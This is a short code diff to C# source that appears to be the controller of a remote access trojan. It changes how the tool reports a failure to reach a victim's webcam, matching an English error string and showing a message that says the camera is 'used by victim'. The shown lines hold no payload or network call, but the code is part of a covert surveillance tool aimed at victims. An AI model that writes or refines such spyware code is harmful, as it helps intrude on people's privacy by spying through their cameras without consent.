@@ -651,9 +651,10 @@ namespace SV
                         string[] s = Encoding.UTF8.GetString(dataBuff).Split(new string[] { "[VERI]" }, StringSplitOptions.None);
                         Invoke((MethodInvoker)delegate
                         {
-                            if (s[1].Contains("Kameraya"))
+                            if (s[1].Contains("An error occured while getting camera list"))
                             {
-                                MessageBox.Show(s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+                                MessageBox.Show(s[1]
+                                    .Replace("[NEW_LINE]", Environment.NewLine)+ "\nUsually this error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                             }
                             else
                             {
